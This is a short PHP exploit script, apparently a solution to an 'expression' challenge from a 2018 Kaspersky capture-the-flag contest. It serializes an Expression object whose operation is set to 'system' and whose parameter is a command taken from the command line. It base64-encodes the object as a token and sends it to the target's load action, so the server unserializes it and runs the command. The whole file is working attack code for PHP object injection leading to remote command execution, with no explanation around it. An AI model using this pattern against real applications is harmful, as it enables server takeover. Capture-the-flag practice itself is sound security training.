<?php

// $url = "http://expression.2018.ctf.kaspersky.com"; // original
$url = "http://localhost:8082";
$expr_op_value = "system";
$expr_param_value = $argv[1];

class Expression {

    private $op;
    private $params;

    public $stringify;

    public function set_op($op) {
        $this->op = $op;
    }

    public function set_params($params) {
        $this->params = $params;
    }
}

$expr = new Expression();
$expr->set_op($expr_op_value);
$expr->set_params($expr_param_value);
$expr->stringify = "flag";

$ser = serialize($expr);

$token = base64_encode($ser);

echo $token . "\n";


echo "[*] Perform request\n\n";
echo file_get_contents("$url/?action=load&token=$token");
